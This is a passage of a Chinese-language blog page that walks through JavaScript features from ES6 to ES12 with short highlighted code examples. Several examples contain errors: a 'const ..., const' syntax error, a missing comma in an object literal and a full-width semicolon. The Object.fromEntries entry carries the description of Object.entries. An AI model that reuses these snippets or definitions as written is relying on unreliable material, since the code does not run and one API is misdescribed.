href="#5-模板字符串" class="headerlink" title="5. 模板字符串"></a>5. 模板字符串</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'小豪'</span><span class="token punctuation">;</span><span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token template-string"><span class="token string">`Your name is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="6-解构赋值"><a href="#6-解构赋值" class="headerlink" title="6. 解构赋值"></a>6. 解构赋值</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token punctuation">,</span> a<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a 2  b 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="7-延展操作符"><a href="#7-延展操作符" class="headerlink" title="7. 延展操作符"></a>7. 延展操作符</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token string">'hello world'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ["h", "e", "l", "l", "o", " ", "w", "o", "r", "l", "d"]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-对象属性简写"><a href="#8-对象属性简写" class="headerlink" title="8. 对象属性简写"></a>8. 对象属性简写</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> name<span class="token operator">=</span><span class="token string">'小豪'</span><span class="token punctuation">,</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="9-Promise"><a href="#9-Promise" class="headerlink" title="9. Promise"></a>9. Promise</h3><pre class="line-numbers language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 先打印 1 ，再打印 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="10-let和const"><a href="#10-let和const" class="headerlink" title="10. let和const"></a>10. let和const</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">'小豪'</span>；<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ES7（2016）"><a href="#ES7（2016）" class="headerlink" title="ES7（2016）"></a>ES7（2016）</h2><h3 id="1-Array-prototype-includes"><a href="#1-Array-prototype-includes" class="headerlink" title="1. Array.prototype.includes()"></a>1. Array.prototype.includes()</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-指数操作符"><a href="#2-指数操作符" class="headerlink" title="2. 指数操作符"></a>2. 指数操作符</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token number">2</span><span class="token operator">**</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1024</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ES8（2017）"><a href="#ES8（2017）" class="headerlink" title="ES8（2017）"></a>ES8（2017）</h2><h3 id="1-async-await"><a href="#1-async-await" class="headerlink" title="1. async/await"></a>1. async/await</h3><p>异步终极解决方案</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> api<span class="token punctuation">.</span><span class="token function">getTableData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// await 异步任务</span>    <span class="token comment" spellcheck="true">// do something    </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Object-values"><a href="#2-Object-values" class="headerlink" title="2. Object.values()"></a>2. Object.values()</h3><pre class="line-numbers language-js"><code class="language-js">Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [1, 2, 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Object-entries"><a href="#3-Object-entries" class="headerlink" title="3. Object.entries()"></a>3. Object.entries()</h3><pre class="line-numbers language-js"><code class="language-js">Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">{</span>a<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [["a", 1], ["b", 2], ["c", 3]]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-String-padding"><a href="#4-String-padding" class="headerlink" title="4. String padding"></a>4. String padding</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// padStart</span><span class="token string">'hello'</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "     hello"</span><span class="token comment" spellcheck="true">// padEnd</span><span class="token string">'hello'</span><span class="token punctuation">.</span><span class="token function">padEnd</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">"hello     "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-函数参数列表结尾允许逗号"><a href="#5-函数参数列表结尾允许逗号" class="headerlink" title="5. 函数参数列表结尾允许逗号"></a>5. 函数参数列表结尾允许逗号</h3><h3 id="6-Object-getOwnPropertyDescriptors"><a href="#6-Object-getOwnPropertyDescriptors" class="headerlink" title="6. Object.getOwnPropertyDescriptors()"></a>6. Object.getOwnPropertyDescriptors()</h3><blockquote><p>获取一个对象的所有自身属性的描述符,如果没有任何自身属性，则返回空对象。</p></blockquote><h3 id="7-SharedArrayBuffer对象"><a href="#7-SharedArrayBuffer对象" class="headerlink" title="7. SharedArrayBuffer对象"></a>7. SharedArrayBuffer对象</h3><blockquote><p>SharedArrayBuffer 对象用来表示一个通用的，固定长度的原始二进制数据缓冲区，</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** *  * @param {*} length 所创建的数组缓冲区的大小，以字节(byte)为单位。   * @returns {SharedArrayBuffer} 一个大小指定的新 SharedArrayBuffer 对象。其内容被初始化为 0。 */</span><span class="token keyword">new</span> <span class="token class-name">SharedArrayBuffer</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-Atomics对象"><a href="#8-Atomics对象" class="headerlink" title="8. Atomics对象"></a>8. Atomics对象</h3><blockquote><p>Atomics 对象提供了一组静态方法用来对 SharedArrayBuffer 对象进行原子操作。</p></blockquote><h2 id="ES9（2018）"><a href="#ES9（2018）" class="headerlink" title="ES9（2018）"></a>ES9（2018）</h2><h3 id="1-异步迭代"><a href="#1-异步迭代" class="headerlink" title="1. 异步迭代"></a>1. 异步迭代</h3><p>await可以和for…of循环一起使用，以串行的方式运行异步操作</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">of</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// doSomething(i);</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Promise-finally"><a href="#2-Promise-finally" class="headerlink" title="2. Promise.finally()"></a>2. Promise.finally()</h3><pre class="line-numbers language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">finally</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-Rest-Spread-属性"><a href="#3-Rest-Spread-属性" class="headerlink" title="3. Rest/Spread 属性"></a>3. Rest/Spread 属性</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>values<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-正则表达式命名捕获组"><a href="#4-正则表达式命名捕获组" class="headerlink" title="4. 正则表达式命名捕获组"></a>4. 正则表达式命名捕获组</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> reg <span class="token operator">=</span> <span class="token regex">/(?&lt;year>[0-9]{4})-(?&lt;month>[0-9]{2})-(?&lt;day>[0-9]{2})/</span><span class="token punctuation">;</span><span class="token keyword">const</span> match <span class="token operator">=</span> reg<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'2021-02-23'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src alt="img"></p><h3 id="5-正则表达式反向断言"><a href="#5-正则表达式反向断言" class="headerlink" title="5. 正则表达式反向断言"></a>5. 正则表达式反向断言</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">=</span>p<span class="token punctuation">)</span><span class="token function">、</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;=</span>p<span class="token punctuation">)</span>  p <span class="token function">前面</span><span class="token punctuation">(</span>位置<span class="token punctuation">)</span>、p <span class="token function">后面</span><span class="token punctuation">(</span>位置<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">!</span>p<span class="token punctuation">)</span><span class="token function">、</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;</span><span class="token operator">!</span>p<span class="token operator">></span><span class="token punctuation">)</span> 除了 p <span class="token function">前面</span><span class="token punctuation">(</span>位置<span class="token punctuation">)</span>、除了 p <span class="token function">后面</span><span class="token punctuation">(</span>位置<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;=</span>w<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3uneb35j30kc02dt8o.jpg" alt="img"></p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token operator">?</span><span class="token operator">&lt;</span><span class="token operator">!</span>w<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3uxmeqnj30kc02mdft.jpg" alt="img"></p><h3 id="6-正则表达式dotAll模式"><a href="#6-正则表达式dotAll模式" class="headerlink" title="6. 正则表达式dotAll模式"></a>6. 正则表达式dotAll模式</h3><blockquote><p>正则表达式中点.匹配除回车外的任何单字符，标记s改变这种行为，允许行终止符的出现</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token regex">/hello.world/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token string">'hello\nworld'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3v9ckjmj30kc03pq2x.jpg" alt="img"></p><h2 id="ES10（2019）"><a href="#ES10（2019）" class="headerlink" title="ES10（2019）"></a>ES10（2019）</h2><h3 id="1-Array-flat-和Array-flatMap"><a href="#1-Array-flat-和Array-flatMap" class="headerlink" title="1. Array.flat()和Array.flatMap()"></a>1. Array.flat()和Array.flatMap()</h3><p>flat()</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token number">Infinity</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [1, 2, 3, 4]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flatMap()</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>a <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>a<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [1, 4, 9, 16]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-String-trimStart-和String-trimEnd"><a href="#2-String-trimStart-和String-trimEnd" class="headerlink" title="2. String.trimStart()和String.trimEnd()"></a>2. String.trimStart()和String.trimEnd()</h3><p>去除字符串首尾空白字符</p><h3 id="3-String-prototype-matchAll"><a href="#3-String-prototype-matchAll" class="headerlink" title="3. String.prototype.matchAll"></a>3. String.prototype.matchAll</h3><blockquote><p>matchAll（）为所有匹配的匹配对象返回一个迭代器</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> raw_arr <span class="token operator">=</span> <span class="token string">'test1  test2  test3'</span><span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token regex">/t(e)(st(\d?))/g</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>raw_arr<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3vj7993j30hw02pdfu.jpg" alt="img"></p><h3 id="4-Symbol-prototype-description"><a href="#4-Symbol-prototype-description" class="headerlink" title="4. Symbol.prototype.description"></a>4. Symbol.prototype.description</h3><blockquote><p>只读属性，回 Symbol 对象的可选描述的字符串。</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'description'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>description<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 'description'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-Object-fromEntries"><a href="#5-Object-fromEntries" class="headerlink" title="5. Object.fromEntries()"></a>5. Object.fromEntries()</h3><blockquote><p>返回一个给定对象自身可枚举属性的键值对数组</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 通过 Object.fromEntries， 可以将 Map 转化为 Object:</span><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// { foo: "bar", baz: 42 }</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6-可选-Catch"><a href="#6-可选-Catch" class="headerlink" title="6. 可选 Catch"></a>6. 可选 Catch</h3><h2 id="ES11（2020）"><a href="#ES11（2020）" class="headerlink" title="ES11（2020）"></a>ES11（2020）</h2><h3 id="1-Nullish-coalescing-Operator-空值处理"><a href="#1-Nullish-coalescing-Operator-空值处理" class="headerlink" title="1. Nullish coalescing Operator(空值处理)"></a>1. Nullish coalescing Operator(空值处理)</h3><p>表达式在 ?? 的左侧 运算符求值为undefined或null，返回其右侧。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span>    u1<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    u2<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    u3<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    u4<span class="token punctuation">:</span> undefined    u5<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">let</span> u2 <span class="token operator">=</span> user<span class="token punctuation">.</span>u2 <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'用户2'</span>  <span class="token comment" spellcheck="true">// false</span><span class="token keyword">let</span> u3 <span class="token operator">=</span> user<span class="token punctuation">.</span>u3 <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'用户3'</span>  <span class="token comment" spellcheck="true">// 用户3</span><span class="token keyword">let</span> u4 <span class="token operator">=</span> user<span class="token punctuation">.</span>u4 <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'用户4'</span>  <span class="token comment" spellcheck="true">// 用户4</span><span class="token keyword">let</span> u5 <span class="token operator">=</span> user<span class="token punctuation">.</span>u5 <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'用户5'</span>  <span class="token comment" spellcheck="true">// ''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Optional-chaining（可选链）"><a href="#2-Optional-chaining（可选链）" class="headerlink" title="2. Optional chaining（可选链）"></a>2. Optional chaining（可选链）</h3><p>?.用户检测不确定的中间节点</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">let</span> u1 <span class="token operator">=</span> user<span class="token punctuation">.</span>childer<span class="token punctuation">.</span>name <span class="token comment" spellcheck="true">// TypeError: Cannot read property 'name' of undefined</span><span class="token keyword">let</span> u1 <span class="token operator">=</span> user<span class="token punctuation">.</span>childer<span class="token operator">?</span><span class="token punctuation">.</span>name <span class="token comment" spellcheck="true">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-Promise-allSettled"><a href="#3-Promise-allSettled" class="headerlink" title="3. Promise.allSettled"></a>3. Promise.allSettled</h3><blockquote><p>返回一个在所有给定的promise已被决议或被拒绝后决议的promise，并带有一个对象数组，每个对象表示对应的promise结果</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> promise1 <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> promise2 <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span><span class="token keyword">const</span> promise3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'我是失败的Promise_1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> promise4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'我是失败的Promise_2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> promiseList <span class="token operator">=</span> <span class="token punctuation">[</span>promise1<span class="token punctuation">,</span>promise2<span class="token punctuation">,</span>promise3<span class="token punctuation">,</span> promise4<span class="token punctuation">]</span>Promise<span class="token punctuation">.</span><span class="token function">allSettled</span><span class="token punctuation">(</span>promiseList<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>values<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3wfibxcj30i103hmx5.jpg" alt="img">  </p><h3 id="4-import"><a href="#4-import" class="headerlink" title="4. import()"></a>4. import()</h3><p>按需导入</p><h3 id="5-新基本数据类型BigInt"><a href="#5-新基本数据类型BigInt" class="headerlink" title="5. 新基本数据类型BigInt"></a>5. 新基本数据类型BigInt</h3><blockquote><p>任意精度的整数</p></blockquote><h3 id="6-globalThis"><a href="#6-globalThis" class="headerlink" title="6. globalThis"></a>6. globalThis</h3><ul><li>浏览器：window</li><li>worker：self</li><li>node：global</li></ul><h2 id="ES12（2021）"><a href="#ES12（2021）" class="headerlink" title="ES12（2021）"></a>ES12（2021）</h2><h3 id="1-replaceAll"><a href="#1-replaceAll" class="headerlink" title="1. replaceAll"></a>1. replaceAll</h3><blockquote><p>返回一个全新的字符串，所有符合匹配规则的字符都将被替换掉</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> str <span class="token operator">=</span> <span class="token string">'hello world'</span><span class="token punctuation">;</span>str<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// "heo word"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-Promise-any"><a href="#2-Promise-any" class="headerlink" title="2. Promise.any"></a>2. Promise.any</h3><blockquote><p>Promise.any() 接收一个Promise可迭代对象，只要其中的一个 promise 成功，就返回那个已经成功的 promise 。如果可迭代对象中没有一个 promise 成功（即所有的 promises 都失败/拒绝），就返回一个失败的 promise</p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> promise1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'我是失败的Promise_1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> promise2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'我是失败的Promise_2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> promiseList <span class="token operator">=</span> <span class="token punctuation">[</span>promise1<span class="token punctuation">,</span> promise2<span class="token punctuation">]</span><span class="token punctuation">;</span>Promise<span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span>promiseList<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>values<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gpw3wvwqo2j30i902swei.jpg" alt="img">  </p><h3 id="3-WeakRefs"><a href="#3-WeakRefs" class="headerlink" title="3. WeakRefs"></a>3. WeakRefs</h3><blockquote><p>使用WeakRefs的Class类创建对对象的弱引用(对对象的弱引用是指当该对象应该被GC回收时不会阻止GC的回收行为)</p></blockquote><h3 id="4-逻辑运算符和赋值表达式"><a href="#4-逻辑运算符和赋值表达式" class="headerlink" title="4. 逻辑运算符和赋值表达式"></a>4. 逻辑运算符和赋值表达式</h3><blockquote><p>逻辑运算符和赋值表达式，新特性结合了逻辑运算符（&amp;&amp;，||，??）和赋值表达式而JavaScript已存在的 复合赋值运算符有：</p></blockquote><pre class="line-numbers language-js"><code class="language-js">a <span class="token operator">||</span><span class="token operator">=</span> b<span class="token comment" spellcheck="true">//等价于</span>a <span class="token operator">=</span> a <span class="token operator">||</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> b<span class="token punctuation">)</span>a <span class="token operator">&amp;&amp;</span><span class="token operator">=</span> b<span class="token comment" spellcheck="true">//等价于</span>a <span class="token operator">=</span> a <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> b<span class="token punctuation">)</span>a <span class="token operator">?</span><span class="token operator">?</span><span class="token operator">=</span> b<span class="token comment" spellcheck="true">//等价于</span>a <span class="token operator">=</span> a <span class="token operator">?</span><span class="token operator">?</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> b<span class="token 